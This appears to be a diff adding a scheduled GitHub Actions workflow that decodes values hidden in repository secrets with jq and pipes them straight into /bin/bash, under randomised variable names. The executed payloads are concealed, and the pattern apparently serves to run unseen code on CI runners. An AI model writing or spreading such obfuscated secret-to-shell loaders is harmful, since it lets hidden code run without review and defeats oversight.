@@ -1,0 +1,28 @@
+name: fenlangguangming
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fenlangguangming
+        env:
+          fvz919: ${{ secrets.fvz919 }}
+        run: |
+          echo $fvz919 | jq -r .o390 | /bin/bash
+          echo $a59 | jq -r .yxhhr189 | /bin/bash
+          echo $prw2666 | jq -r .ze704 | /bin/bash
+          echo $pj189 | jq -r .zkvls496 | /bin/bash
+          echo $gsjb302 | jq -r .b503 | /bin/bash
+          echo $mhnvq251 | jq -r .yz875 | /bin/bash
+          echo $fzahz92779 | jq -r .esgn908 | /bin/bash
+          echo $gde68109 | jq -r .j542 | /bin/bash
+          echo $qkb6 | jq -r .qpc7 | /bin/bash
+          echo $luh8376 | jq -r .wjkm51 | /bin/bash
+
